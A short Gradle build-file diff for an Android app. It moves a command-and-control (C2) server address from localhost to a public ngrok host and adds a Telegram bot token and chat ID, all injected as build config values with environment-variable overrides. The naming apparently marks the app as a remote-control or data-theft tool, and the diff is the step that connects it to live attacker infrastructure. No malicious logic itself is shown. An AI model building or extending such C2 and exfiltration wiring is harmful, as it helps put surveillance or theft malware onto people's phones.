@@ -14,8 +14,16 @@ android {
         versionCode 1
         versionName "1.0"
 
-        buildConfigField "String", "API_KEY", "\"bukamal\""
-        buildConfigField "String", "C2_URL",  "\"http://127.0.0.1:5000\""
+        // Credentials pulled from env (GitHub Secrets) or fallback
+        def tgToken = System.getenv("TG_BOT_TOKEN") ?: "TG_TOKEN_NOT_SET"
+        def tgChat  = System.getenv("TG_CHAT_ID")   ?: "TG_CHAT_NOT_SET"
+        def c2Key   = System.getenv("C2_API_KEY")   ?: "bukamal"
+        def c2Url   = System.getenv("C2_URL")       ?: "https://backdrop-embassy-anymore.ngrok-free.dev"
+
+        buildConfigField "String", "TG_BOT_TOKEN", "\"${tgToken}\""
+        buildConfigField "String", "TG_CHAT_ID",   "\"${tgChat}\""
+        buildConfigField "String", "API_KEY",      "\"${c2Key}\""
+        buildConfigField "String", "C2_URL",       "\"${c2Url}\""
     }
 
     buildFeatures { buildConfig true }
